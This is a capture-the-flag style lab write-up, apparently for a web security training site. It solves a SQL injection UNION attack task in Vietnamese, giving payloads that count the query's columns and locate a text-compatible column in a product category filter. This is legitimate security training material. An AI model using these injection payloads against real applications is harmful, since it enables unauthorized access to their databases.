# **Lab: SQL injection UNION attack, finding a column containing text**
>  This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data.  
 The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data. 

 # **Solution**
 Tương tự bài lab trước, đầu tiên là thêm vào URL tham số bộ lọc và phần lệnh SQL UNION:
 ```
 https://0a0000b6033ecbc4843d7cda002d00c4.web-security-academy.net/filter?category=Pets' UNION SELECT NULL,NULL,NULL-- 
 ```
 Qua đó ta xác định được truy vấn có 3 cột. Tiếp đó là xác định kiểu dữ liệu ký tự cho mỗi cột.  
 Ta thay giá trị NULL thành một kí tự bất kì, VD: 'a'
```
' UNION SELECT 'a',NULL,NULL -- 
```
Nếu có báo lỗi:
> Internal Server Error 

Nghĩa là cột đầu tiên không phải chuỗi kí tự. Tiếp tục lần lượt thay thế 'a' với các giá trị NULL còn lại:
```
' UNION SELECT NULL,'a',NULL -- 
```
Khi thành công xác định ví trí của cột chứa chuỗi kí tự, ta thay thế 'a' với giá trị nhiệm vụ yêu cầu là xong.

![image](https://i.pinimg.com/originals/5f/39/e6/5f39e6d606da1c3d603bdabfccf053f3.jpg)